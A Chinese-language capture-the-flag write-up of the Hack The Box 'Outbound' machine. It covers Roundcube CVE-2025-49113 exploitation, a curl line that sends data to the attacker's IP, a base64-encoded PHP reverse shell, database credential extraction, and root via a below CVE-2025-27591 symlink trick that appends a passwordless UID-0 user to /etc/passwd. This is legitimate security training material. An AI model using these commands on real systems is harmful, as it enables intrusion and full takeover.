## nmap

话不多说

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# nmap -sC -sV -Pn 10.10.11.77    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-18 05:19 EDT
Nmap scan report for 10.10.11.77
Host is up (0.72s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.48 seconds
```

名字看起来是跟邮件相关的，IP域名添加进hosts：

```bash
echo '10.10.11.77 mail.outbound.htb' >> /etc/hosts
```

访问进入页面：


![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/a3ad11b62f064b81acee97f3b060562f.png)

## Roundcube Webmail

搜一下这是什么：
[此官网](https://roundcube.net/)
[GitHub](https://github.com/roundcube/roundcubemail)
目前想知道它的版本信息内容，访问以下URL：
`http://mail.outbound.htb/roundcube/CHANGELOG.md`
`http://mail.outbound.htb/roundcube/INSTALL`
会自动下载`CHANGELOG.md`和`INSTALL`

版本`1.6.10`搜索发现漏洞：

## Roundcube Webmail upload.php _from 反序列化代码执行漏洞（CVE-2025-49113）

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/99ca41d9d7f9475988ecc4a4e1f17681.png)


这个漏洞需要用户登录，折回去看了一眼才发现给了账号密码：

> As is common in real life pentests, you will start the Outbound box with credentials for the following
>  account `tyler` / `LhKL1o9Nm3X2`

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/4c8899097d164e1ca23398b54d151a26.png)


把前面的exploit.git克隆下来，用法说明很清晰操作很便捷：


![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/0ce992b706134685857c663a23c888b8.png)

## 反向连接

先which目标服务器上是否存在这些程序，丢弃错误信息，结果base64编码单行返回：

```bash
php CVE-2025-49113.php 'http://mail.outbound.htb/' tyler LhKL1o9Nm3X2 \
'curl http://10.10.16.5:10086/$(which python nc bash sh ncao curl rustcat openssl perl php ruby socat ndoe java telnet zsh lua golang vlang awk nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null| base64 -w0)'
```

nc监听返回的base64：

```bash
GET /L3Vzci9iaW4vYmFzaAovdXNyL2Jpbi9zaAovdXNyL2Jpbi9jdXJsCi91c3IvYmluL29wZW5zc2wKL3Vzci9iaW4vcGVybAovdXNyL2Jpbi9waHAKL3Vzci9iaW4vc29jYXQKL3Vzci9iaW4vYXdrCi91c3IvYmluL3dnZXQKL3Vzci9iaW4vY3VybAovdXNyL2Jpbi9iYXNlNjQKL3Vzci9iaW4vc29jYXQKL3Vzci9iaW4vcGVybAovdXNyL2Jpbi9waHAK HTTP/1.1
Host: 10.10.16.5:10086
User-Agent: curl/8.5.0
```

解密后：

```bash
/usr/bin/bash
/usr/bin/sh
/usr/bin/curl
/usr/bin/openssl
/usr/bin/perl
/usr/bin/php
/usr/bin/socat
/usr/bin/awk
/usr/bin/wget
/usr/bin/curl
/usr/bin/base64
/usr/bin/socat
/usr/bin/perl
/usr/bin/php
```

建立Socket连接，将Bash的输入（<&3）、输出（>&3）、错误（2>&3）全部重定向到文件描述符 3（即之前打开的Socket连接）：

```bash
/usr/bin/php -r '$sock=fsockopen("10.10.16.5",10086);exec("/bin/bash <&3 >&3 2>&3");'
```

然后把上面的反向连接base64|解码到bash：

```bash
echo "L3Vzci9iaW4vcGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjEwLjE2LjUiLDEwMDg2KTtleGVjKCIvYmluL2Jhc2ggPCYzID4mMyAyPiYzIik7Jw==" | base64 -d | bash
```

exploit反向连接：

```bash
┌──(root㉿kali)-[/home/kali/Desktop/CVE-2025-49113-exploit]
└─# php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 'echo L3Vzci9iaW4vcGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjEwLjE2LjUiLDEwMDg2KTtleGVjKCIvYmluL2Jhc2ggPCYzID4mMyAyPiYzIik7Jw== | base64 -d | bash'
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
```

监听返回，连接成功：


![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/5ddae971b8214a56ba87e0a2eb03be6e.png)


列出隐藏文件发现这是个docker环境，所以ssh连接不太可行：

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/c9fa82236c164b9bb616793b7501b707.png)



在这里我们知道tyler的邮箱账号密码，试验后发现也可以连接：


![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/80d12c353b1e4475ac5e22a51bc4ba93.png)



列出所有用户：


![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/b40cf252fa034e8183f3e7f51f05629f.png)


端口信息：

```bash
ss -tuln
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
tcp   LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*          
tcp   LISTEN 0      100          0.0.0.0:995       0.0.0.0:*          
tcp   LISTEN 0      100          0.0.0.0:993       0.0.0.0:*          
tcp   LISTEN 0      100          0.0.0.0:143       0.0.0.0:*          
tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*          
tcp   LISTEN 0      100          0.0.0.0:110       0.0.0.0:*          
tcp   LISTEN 0      100        127.0.0.1:25        0.0.0.0:*          
tcp   LISTEN 0      100             [::]:995          [::]:*          
tcp   LISTEN 0      100             [::]:993          [::]:*          
tcp   LISTEN 0      100             [::]:143          [::]:*          
tcp   LISTEN 0      100             [::]:110          [::]:*          
tcp   LISTEN 0      100            [::1]:25           [::]:*   
```

## MYSQL数据库

发现开放了3306，那就去`var/www/html/`目录下面找：


![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/4163aee35ad248f083f783bffb1bfe51.png)


去roundcube里在config目录下发现：

```bash
cat config.inc.php
<?php

/*
 +-----------------------------------------------------------------------+
 | Local configuration for the Roundcube Webmail installation.           |
 |                                                                       |
 | This is a sample configuration file only containing the minimum       |
 | setup required for a functional installation. Copy more options       |
 | from defaults.inc.php to this file to override the defaults.          |
 |                                                                       |
 | This file is part of the Roundcube Webmail client                     |
 | Copyright (C) The Roundcube Dev Team                                  |
 |                                                                       |
 | Licensed under the GNU General Public License version 3 or            |
 | any later version with exceptions for skins & plugins.                |
 | See the README file for a full license statement.                     |
 +-----------------------------------------------------------------------+
*/

$config = [];

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

// IMAP host chosen to perform the log-in.
// See defaults.inc.php for the option description.
$config['imap_host'] = 'localhost:143';

// SMTP server host (for sending mails).
// See defaults.inc.php for the option description.
$config['smtp_host'] = 'localhost:587';

// SMTP username (if required) if you use %u as the username Roundcube
// will use the current username for login
$config['smtp_user'] = '%u';

// SMTP password (if required) if you use %p as the password Roundcube
// will use the current user's password for login
$config['smtp_pass'] = '%p';

// provide an URL where a user can get support for this Roundcube installation
// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
$config['support_url'] = '';

// Name your service. This is displayed on the login screen and in the window title
$config['product_name'] = 'Roundcube Webmail';

// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';

// List of active plugins (in plugins/ directory)
$config['plugins'] = [
    'archive',
    'zipdownload',
];

// skin name: folder from skins/
$config['skin'] = 'elastic';
$config['default_host'] = 'localhost';
$config['smtp_server'] = 'localhost';
```

连接数据库查询：

```bash
mysql -u roundcube -pRCDBPass2025 -e "SHOW DATABASES;"
Database
information_schema
roundcube
mysql -u roundcube -pRCDBPass2025 -e "USE roundcube;SHOW TABLES;"
Tables_in_roundcube
cache
cache_index
cache_messages
cache_shared
cache_thread
collected_addresses
contactgroupmembers
contactgroups
contacts
dictionary
filestore
identities
responses
searches
session
system
users
mysql -u roundcube -pRCDBPass2025 -e "USE roundcube;SELECT * FROM users ;"
user_id username        mail_host       created  last_login      failed_login    failed_login_counter     language        preferences
1       jacob   localhost       2025-06-07 13:55:18      2025-06-11 07:52:49     2025-06-11 07:51:32      1       en_US   a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}
2       mel     localhost       2025-06-08 12:04:51      2025-06-08 13:29:05     NULL     NULL    en_US   a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}
3       tyler   localhost       2025-06-08 13:28:55      2025-07-21 09:43:25     2025-06-11 07:51:22      1       en_US   a:1:{s:11:"client_hash";s:16:"Y2Rz3HTwxwLJHevI";}
mysql -u roundcube -pRCDBPass2025 -e "USE roundcube;SELECT * FROM session ;"
sess_id changed ip      vars
6a5ktqih5uca6lj8vrmgh9v0oh      2025-06-08 15:46:40      172.17.0.1      bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7
```

解码：


![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/db5893a3e81841ceb04b5cec1a47548d.png)


在bin目录下发现解码脚本：


![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/35e464c2d41d4d0fa1139bac2cab8472.png)


密码来了：


![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/632496e77a1d43789defdeb537f28b89.png)


登录jacob用户：


![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/75e1633c228544e8be4f6118d667f02c.png)


`/var/mail/`下cat


![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/0a652b25f01d4802a0e417d3d90fa47b.png)


这里也可直接图形界面登录：


![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/46d012c1bf3446888c3ea06860af01c8.png)


那么接下来SSH直接登：

```bash
ssh jacob@10.10.11.77
```

成功登录：


![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/36e0695c6e364e9bb0060e07ab2250a9.png)


哈哈还能看到前一个HTBer的IP号数和登录时间
ls就是flag

## 提权

```bash
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on
    outbound:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jacob may run the following
        commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below
        *, !/usr/bin/below --config*,
        !/usr/bin/below --debug*,
        !/usr/bin/below -d*
```

jacob可以以 `root` 权限无密码运行 `/usr/bin/below` 命令，但有以下限制：

    不能使用 --config、--debug 或 -d 参数。

一般思路：

1. 优先分析 /usr/bin/below 的功能和参数。
2. 尝试绕过参数限制执行命令或读取文件。
3. 检查环境变量、路径注入或动态库劫持的可能性。
4. 如果其他方法失败，可以尝试逆向分析 below 的二进制文件。

既然是below那就互联网直接搜below，出来网页最多的就是CVE-2025-27591提权漏洞

## CVE-2025-27591·改

[概述与公开poc](https://cve.imfht.com/detail/CVE-2025-27591)
[利用思路](https://cn-sec.com/archives/3888390.html)


![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/75c4e5f4c54846158bcd9d5346d5a595.png)


`error_root.log`是可写状态：

```bash
jacob@outbound:/var/log/below$ ls -al
total 16
drwxrwxrwx  3 root  root   4096 Jul 20 12:32 .
drwxrwxr-x 13 root  syslog 4096 Jul 20 11:37 ..
lrwxrwxrwx  1 jacob jacob    11 Jul 20 12:16 error_jacob.log -> /etc/passwd
-rw-rw-rw-  1 root  root      0 Jul 20 12:32 error_root.log
-rw-rw-r--  1 jacob jacob    32 Jul 20 12:16 fakepass
drwxr-xr-x  2 root  root   4096 Jul 20 11:37 store
```

将 `/etc/passwd` 链接到 `/var/log/below/error_root.log`

```bash
ln -sf /etc/passwd /var/log/below/error_root.log
```

使用below工具创建/root目录的磁盘快照

```bash
sudo below dump --snapshot /root/ disk --begin now
```

```bash
ls -al /etc/passwd
```

创建abc用户有UID 0（root权限），没有密码（两个冒号之间为空）
主目录为/root，使用/bin/bash作为shell
等价root

```bash
echo 'abc::0:0:abc:/root:/bin/bash' >> /etc/passwd
```

su了


![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/f76b24b385e8418b9f9732026a3610f0.png)


终于


![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/edd17a9c82234cdca6b24f21eb0e8d72.png)

# WP

[HTB-Outbound](https://www.hyhforever.top/posts/2025/07/htb-outbound/)
[HTB 赛季8靶场 - Outbound](https://blog.csdn.net/weixin_44368093/article/details/149333686)
[HTB Outbound - Complete Walkthrough](https://www.1337sheets.com/p/hack-the-box-htb-outbound-writeup-easy-season-weekly-july-th)
